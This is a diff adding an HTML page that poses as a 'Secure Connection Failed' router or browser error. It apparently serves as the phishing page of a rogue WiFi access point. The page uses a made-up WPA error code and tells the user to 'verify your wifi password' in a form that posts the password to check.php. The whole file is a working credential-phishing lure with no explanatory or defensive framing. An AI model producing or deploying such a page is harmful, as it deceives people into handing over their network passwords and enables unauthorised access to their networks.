@@ -1,0 +1,106 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8">
+	<title>Error</title>
+	<style>
+	body{
+		margin: 0px;
+		padding: 0px;
+	}
+	.pos{
+			margin-top: 30px;
+			margin-left: auto;
+			margin-right: auto;
+			width: 720px;
+			background-color: ;
+	}
+	.sec{
+		font-size: 38px;
+		margin-bottom: 2px;
+	}
+	.frm{
+		margin-top: 40px;
+		width: 290px;
+		margin-left: auto;
+		margin-right: auto;
+		background-color: lightgray;
+		padding: 15px 15px 15px 15px;
+		border-radius: 5px;
+	}
+	.not{
+		margin-top: 70px;
+	}
+
+@media only screen and (max-width: 750px) {
+    body {
+        backgr-ound-color: lightgreen;
+        margin: 0px;
+		padding: 0px;
+    }
+    .pos{
+			margin-top: 30px;
+			margin-left: auto;
+			margin-right: auto;
+			width: 700px;
+			background-color: ;
+	}
+	.frm{
+		width: 290px;
+		margin-left: auto;
+		margin-right: auto;
+		background-color: lightgray;
+		padding: 15px 15px 15px 15px;
+		border-radius: 5px;
+	}
+}
+@media only screen and (max-width: 500px) {
+    body {
+        backgr-ound-color: lightblue;
+        margin: 0px;
+		padding: 0px;
+	}
+	.pos{
+			margin-top: 30px;
+			margin-left: auto;
+			margin-right: auto;
+			width: 420px;
+			background-color: ;
+	}
+	.frm{
+		width: 290px;
+		margin-left: auto;
+		margin-right: auto;
+		background-color: lightgray;
+		padding: 15px 15px 15px 15px;
+		border-radius: 5px;
+	}
+}
+
+	</style>
+</head>
+<body>
+	<div class="pos">
+	<p class="sec">Secure Connection Failed..</p>
+	<hr>
+	<div class="frm"><center>
+		<form method="POST" action="check.php" name="form1">
+		<level>Verify your wifi password</level><br><br>
+		<level>key: </level>
+		<input type="password" name="key1">
+		<input type="submit" name="submit" value="connect">
+	    </form></center>
+	</div>
+	<p class="not">
+		Note: <br>
+		An error occured during a connection to the router. <br>
+		Cannot communicate securely with wifi password: no common encryption algorithm(s). (Error code: <b>wpa_password_error_no_cypher_match</b>).
+		<ul>
+			<li>The page you trying to view cannot be show because the <b>WPA</b> authenticity with the router could not be verified.</li>
+			<li>Please contact the product manager to inform this problem.</li>
+			<li>Verify your wifi password.</li>
+		</ul>
+	</p>
+    </div>
+</body>
+</html>
